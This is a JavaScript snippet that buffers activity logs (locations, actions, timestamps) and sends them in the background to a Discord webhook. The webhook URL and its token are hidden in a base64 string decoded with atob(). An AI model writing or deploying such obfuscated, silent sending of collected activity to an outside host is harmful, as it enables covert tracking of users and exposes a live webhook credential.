const varone = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NjE1NDA4Nzg3MDM2NTc1OS9RanRhQ2tBLUN1WktLTU9Ja2RsdkQ4ME8tZTJON1B1M3dBUWZUOXh5aHRQTkRTUUp0NVlFdlBidms5MjlVbFFXcGQ0Sg==");

// Store logs
let allLogs = [];
let currentGroup = [];

// Get timestamp
function getTimestamp() {
    const now = new Date();
    return `${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
}

// Add a log entry
function addLog(message) {
    allLogs.push(message);
    console.log('📝', message);
}

// Group actions under a location
function addAction(location, action, timestamp) {
    if (currentGroup.length === 0 || currentGroup[0] !== location) {
        if (currentGroup.length > 0) {
            allLogs.push(currentGroup.join(' '));
        }
        currentGroup = [location];
    }
    currentGroup.push(`${action} [${timestamp}]`);
}

// Flush current group to logs
function flushGroup() {
    if (currentGroup.length > 0) {
        allLogs.push(currentGroup.join(' '));
        currentGroup = [];
    }
}

// Send all logs to Discord and clear
function sendLogs() {
    flushGroup();
    
    if (allLogs.length === 0) return;
    
    const fullMessage = `${allLogs.join('\n')}`;
    
    // Fire and forget - don't wait for the response
    fetch(varone, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: fullMessage.substring(0, 2000) })
    }).catch(error => console.error('❌ Failed:', error));
    
    // Clear immediately - don't wait for the fetch to complete
    allLogs = [];
    currentGroup = [];
    console.log('📤 Sent to Discord');
}